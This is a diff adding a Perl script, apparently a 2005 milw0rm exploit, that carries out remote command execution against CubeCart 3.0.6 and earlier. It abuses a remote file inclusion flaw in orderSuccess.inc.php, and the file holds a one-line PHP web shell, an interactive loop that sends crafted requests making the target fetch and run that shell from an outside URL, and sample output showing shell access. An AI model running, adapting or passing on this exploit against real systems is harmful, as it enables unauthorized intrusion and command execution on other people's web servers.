@@ -1,0 +1,126 @@
+#!/usr/bin/perl
+#
+# cijfer-ccxpl - CubeCart <=3.0.6 Remote Command Execution Exploit
+#
+# Copyright (c) 2005 cijfer <cijfer@netti.fi>
+# All rights reserved.           
+#
+## 1. example
+#
+# [cijfer@kalma:/research]$ perl ./cijfer-ccxpl.pl -h www.xxx.com -d
+# [cijfer@www.xxx.com /]$ id;uname -a
+# uid=48(apache) gid=48(apache) groups=48(apache),2523(psaserv)
+# Linux server.xxx.com 2.6.10-1.771_FC2 #1 Mon Mar 28 00:50:14 EST 2005 i686 i686 i386 GNU/Linux
+#
+# [cijfer@www.xxx.com /]$
+#
+## 2. explanation
+#
+# a serious bug was discovered by me in CubeCart 3.0.6 and below which an attacker
+# can remotely execute arbitrary commands via 'includes/orderSuccess.inc.php' where  
+# passing input to the 'glob' and 'cart_order_id' variable, we can attain access to
+# passing input to the 'glob[rootDir]' variable, and include a remote execution script
+# to execute arbitrary commands. as usual, this requires 'register_globals' to be
+# enabled in order to successfully do this, otherwise a 403 error will show.
+#
+## 3. the bug
+#
+# this below allows us to bypass the 403 error...
+#
+#       <?
+#       ...
+#       if(!isset($glob)){                                              [1]
+#       ...
+#
+# pass more positive input to $cart_order_id and do you notice what is wrong here?
+#       ...
+#       if(isset($cart_order_id) && !empty($cart_order_id)){            [2]
+#               // build thank you and confirmation email
+#               include($glob['rootDir']."/classes/htmlMimeMail.php");  [3] !dangerous!
+#               $mail = new htmlMimeMail();
+#       ...
+#
+## 4. the php shell
+#
+# this exploit grabs data via regular expression strings. foreign php shell
+# scripts will not work with this exploit. use the following code along with
+# this exploit and put it in 'cmd.txt' or whatever you please:
+#
+#       <?passthru($_GET[cmd]);?>
+#
+## 5. the greets
+#
+# kippis to Zodiac, felosi, and odz. also shouts to lethal & hexy
+#
+##
+#
+# $Id: cijfer-ccxpl.pl,v 0.2 2005/12/30 06:02:00 cijfer Exp cijfer $
+
+use Getopt::Std;
+use IO::Socket;
+use URI::Escape;
+
+getopts("h:d:");
+
+$host = $opt_h;
+$dirs = $opt_d;
+$shel = "http://website.com/cmd.txt";    # cmd shell url
+$cmdv = "cmd";                           # cmd variable (ex. passthru($_GET[cmd]);)
+$good = 0;
+
+if(!$host||!$dirs)
+{
+        print "cijfer-ccxpl.pl by cijfer\n";
+        print "usage: $0 -h cijfer.xxx -d /cubecart\r\n";
+        print "usage: $0 -h <hostname> -d <directory>\r\n";
+        exit();
+}
+
+while()
+{
+        print "[cijfer@".$host." /]\$ ";
+        while(<STDIN>)
+        {
+                $cmds=$_;
+                chomp($cmds);
+                last;
+        }
+
+        $string  = $dirs;
+        $string .= "/includes/orderSuccess.inc.php?";
+        $string .= uri_escape($cmdv);
+        $string .= "=";
+        $string .= "%65%63%68%6F%20%5F%53%54%41%52%54%5F%3B";
+        $string .= uri_escape($cmds).";echo";
+        $string .= "%3B%65%63%68%6F%20%5F%45%4E%44%5F;echo;";
+        $string .= "&glob=1&cart_order_id=1&glob[rootDir]=";
+        $string .= $shel;
+        $string .= "?";
+
+        $sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => $host, PeerPort => 80) || die "error: connect()\n";
+
+        print $sock "GET $string HTTP/1.1\n";
+        print $sock "Host: $host\n";
+        print $sock "Accept: */*\n";
+        print $sock "Connection: close\n\n";
+
+        while($result = <$sock>)
+        {
+                if($result =~ /^_END_/)
+                {
+                        $good=0;
+                }
+
+                if($good==1)
+                {
+                        print $result;
+                }
+
+                if($result =~ /^_START_/)
+                {
+                        $good=1;
+                }
+        }
+}
+
+# milw0rm.com [2005-12-30]
